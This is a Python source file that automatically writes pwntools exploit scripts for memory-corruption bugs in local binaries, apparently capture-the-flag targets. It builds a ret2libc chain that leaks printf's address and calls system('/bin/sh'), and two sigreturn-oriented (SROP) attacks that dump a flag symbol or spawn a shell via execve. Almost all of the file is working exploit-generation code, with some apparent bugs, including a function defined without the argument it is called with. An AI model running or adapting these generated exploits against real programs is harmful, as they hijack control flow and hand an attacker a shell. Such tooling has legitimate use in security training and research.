def write_file(text):
    """
        Writes the final exploit in the 'new_exploit.py' file
    """
    with open("new_exploit.py", "w") as f:
        f.write(text)

def generate_exploit_ret2libc(n, offset, binary_file, input):   

    """
        Writes the final exploit in the 'new_exploit.py' file
        Arguments:
            n: iteration containing the potential vulnerability
            offset: offset to the return address
            binary_file: name of the binary file
            input: input causing the vulnerability
        
    """

    header="from pwn import *\nimport time\nimport subprocess\nimport sys\nimport re\nimport argparse\n"
    leak_funct="\ndef getLeak(message):\n   pattern = re.compile(rb'(?:[^\\n]+)?[\\x00-\\xff]+\\x7f')\n   matches = pattern.findall(message)\n   string=b''\n   for i, match in enumerate(matches, 1):\n   	string+=match\n   string = string.replace(b'\\n', b'')\n   string = string.replace(b'Hello', b'')\n   return string"


    exploit=f"\n\ncontext.binary = binary = ELF(\"{binary_file}\")\nrop=ROP(binary)\np = process()\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=True)\n"
    exploit+="\nprintf_got=p64(binary.got.printf)"
    exploit+="\nputs_plt=p64(binary.plt.puts)"
    exploit+="\npop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])"
    exploit+="\nmain=p64(binary.symbols.main)"
    exploit+=f"\nrop_chain1=b'A'*{offset}+pop_rdi+printf_got+puts_plt+main"  
    exploit+=f"\nfor i in range({n}):"
    exploit+=f"   \n   o1=p.recvuntil('?')\n   p.sendline(str({input}))"
    exploit+="\no3=p.recvuntil('?')"
    exploit+="\np.sendline(rop_chain1)"
    exploit+="\nout = p.recvuntil('?')"
    exploit+="\nleak =  getLeak(out).rstrip().ljust(8,b'\\x00')"
    exploit+="\naddress = u64(leak)"
    exploit+="\nbase =address - libc.symbols.printf"
    exploit+="\nlibc.address=base"
    exploit+="\npause()"
    exploit+=f"\nrop_chain_2= b'A'*{offset}"
    exploit+="\nrop_chain_2 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])"
    exploit+="\nrop_chain_2 += p64(next(libc.search(b'/bin/sh'))) #p64(bin)"
    exploit+="\nrop_chain_2 += p64(rop.find_gadget(['ret'])[0])"
    exploit+="\nrop_chain_2 += p64(libc.symbols.system)"
    exploit+=f"\np.sendline(str({input}))"  
    exploit+=f"\nfor i in range({n}-1):"
    exploit+="   \n   o1=p.recvuntil('?')\n   p.sendline(b'1')"
    exploit+="\no5=p.recvuntil('?')"
    exploit+="\npause()"
    exploit+="\np.sendline(rop_chain_2)"
    exploit+="\np.interactive()"

    final_exploit=""
    final_exploit+=header
    final_exploit+=leak_funct
    final_exploit+=exploit
    write_file(final_exploit)


def get_sigreturn():
    """
        Defines the text string with the definition of the getSigReturn function.     
        Returns the text string containing the definition.  
    """
    sigreturn="\n\ndef getSigReturn(binary_name):\n    rop=ROP(binary_name)\n    os.system(''' ROPgadget --binary '''+binary_name+ '''| grep \": mov eax, 0xf ; syscall\" > sigreturn.txt''' )"
    sigreturn+= "\n    pop_rax = rop.find_gadget(['pop rax'])[0]"
    sigreturn+="\n    syscall = rop.find_gadget(['syscall'])[0]"
    sigreturn+="\n    if os.path.getsize('sigreturn.txt') == 0:"
    sigreturn+="\n       payload = p64(pop_rax)"
    sigreturn+="\n       payload += p64(0xf)"
    sigreturn+="\n       payload += p64(syscall)"
    sigreturn+="\n       os.system('rm'+' sigreturn.txt')"
    sigreturn+="\n       return payload"
    sigreturn+="\n    with open('sigreturn.txt', 'r') as file:"
    sigreturn+="\n      first_line = file.readline().strip()"
    sigreturn+="\n      address = first_line.split()[0]"
    sigreturn+="\n      first_address = address_to_bytes(address)"
    sigreturn+="\n    os.system('rm'+' sigreturn.txt')"
    sigreturn+="\n    return first_address"
    return sigreturn





def generate_sigrop_1(binary_file):
    """
        Defines the text string with the definition of the complete SIGROP attack of the first type.       
        Writes the final exploit code to a file
        Arguments:
            binary_file: the binary file
    """
    win_funct="def find_win_funct(elf):\n    WIN_FUNCTIONS=[\"flag\", \"key\"]\n    for func in WIN_FUNCTIONS:\n"    
    win_funct+="        win_funct=elf.symbols[func]\n        if win_funct == None:\n          continue"
    win_funct+="\n        else:"
    win_funct+="\n          return win_funct"
    win_funct+="\n    return None"        
    
    sigreturn = get_sigreturn()
    header="from pwn import *\nimport time\nimport subprocess\nimport sys\nimport re\nimport argparse\n"
    header+="\nlibc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)\n"

    win_funct_frame="\n\ndef get_win_funct_sigreturn_frame(binary, libc, win_funct):\n    flag_size= 200\n    frame = SigreturnFrame()\n    frame.rip = rop.find_gadget(['syscall'])[0]" 
    win_funct_frame+="\n    frame.rax = int(constants.SYS_write)"
    win_funct_frame+="\n    frame.rdi = int(constants.STDOUT_FILENO)"
    win_funct_frame+="\n    frame.rsi = win_funct" 
    win_funct_frame+="\n    frame.rdx = flag_size"
    win_funct_frame+="\n    return frame"
    
    attack=f"\n\ncontext.binary = binary = ELF(\"{binary_file}\")"
    attack+="\nrop=ROP(binary)"
    attack+="\np = process()"
    attack+=f"\nsigreturn = getSigReturn(\"{binary_file}\")"
    attack+=f"\ns = process(\"{binary_file}\")"
    attack+="\nwin_funct= find_win_funct(binary)"
    attack+="\nframe = get_win_funct_sigreturn_frame(binary, libc, win_funct)"
    attack+="\npayload=b\"\""
    attack+="\npayload += bytes(frame)"
    attack+="\ns.send(payload)"
    attack+="\ns.interactive()"

    exploit=header+win_funct+win_funct_frame+sigreturn+attack
    write_file(exploit)


def search_bin_sh():
    """
        Defines the text string with the definition of the 'search_bin_sh' function.     
        Returns the text string containing the definition.  
    """
    search=f"\ndef search_bin_sh(binary_name):"
    search+="\n   pr = process([\"gdb\", binary_name])"
    search+="\n   pr.recvuntil(\"gef➤\")"
    search+="\n   pr.sendline(\"start\")"
    search+="\n   binsh=pr.recvuntil(\"gef➤\")"
    search+="\n   pr.sendline(\"search-pattern /bin/sh\")"
    search+="\n   binsh=pr.recvuntil(\"gef➤\")"
    search+="\n   bin=identify(binsh)"
    search+="\n   pr.kill()"
    search+="\n   return int(bin, 16)"
    return search

def get_identify():
    """
        Defines the text string with the definition of the 'identify' function.     
        Returns the text string containing the definition.  
    """
    identify="\ndef identify(binsh):"
    identify+="\n    pattern = r'0x[0-9a-fA-F]+'"
    identify+="\n    data_str = binsh.decode('utf-8', 'ignore')"
    identify+="\n    matches = re.findall(pattern, data_str)"
    identify+="\n    matches = re.findall(pattern, data_str)"
    identify+="\n    matches = re.findall(pattern, data_str)"
    identify+="\n    if not matches:"
    identify+="\n        vprint(\"Binsh not found\")"
    identify+="\n    return matches[2]"
    return identify
        
    
def get_frame():
    """
        Defines the text string with the definition of the 'get_sigreturn_frame' function.     
        Returns the text string containing the definition.  
    """
    frame="\ndef get_sigreturn_frame(rop, bin):"
    frame+="\n    frame = SigreturnFrame()"
    frame+="\n    frame.rax = int(constants.SYS_execve)"
    frame+="\n    frame.rdi = bin"
    #frame["rsi"] = 0
    #frame["rdx"] = 0
    frame+="\n    frame.rip = rop.find_gadget(['syscall'])[0]" #u64(rop.find_gadget(['syscall'])[0])"
    frame+="\n    return bytes(frame)"
    return frame


def address_to_bytes():
    """
        Defines the text string with the definition of the 'address_to_bytes' function.     
        Returns the text string containing the definition.  
    """
    attack=f"\ndef address_to_bytes(address):"
    attack+=f"\n    int_address = int(address, 16)"  
    attack+=f"\n    bytes_address = int_address.to_bytes(8, byteorder='little')"
    attack+=f"\n    return bytes_address"
    return attack

def generate_sigrop_2(binary_file, offset):
    """
        Defines the text string with the definition of the complete SIGROP attack of the second type.       
        Writes the final exploit code to a file
    """

    header="from pwn import *\nimport time\nimport subprocess\nimport sys\nimport re\nimport argparse\n"
    header+="\nlibc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)\n"
    sigreturn = get_sigreturn()
    identify = get_identify()
    frame = get_frame()
    address2bytes = address_to_bytes()
    attack=f"\n\ncontext.binary = binary = ELF(\"{binary_file}\")"
    attack+=f"\n\nbin = search_bin_sh('{binary_file}')"
    attack+=f"\nrop=ROP(binary)"
    attack+=f"\nframe = get_sigreturn_frame(rop, bin)"
    attack+=f"\nsigreturn=getSigReturn(\"{binary_file}\")"
    attack+=f"\npayload = b\"a\"*{offset}"
    attack+=f"\npayload += sigreturn"
    attack+="\npayload += frame"
    attack+=f"\ns=process(\"{binary_file}\")"
    attack+="\ns.send(payload)"
    attack+="\ns.interactive()"

    exploit=header + identify + frame + address2bytes+ search_bin_sh() + sigreturn+attack
    write_file(exploit)
    
    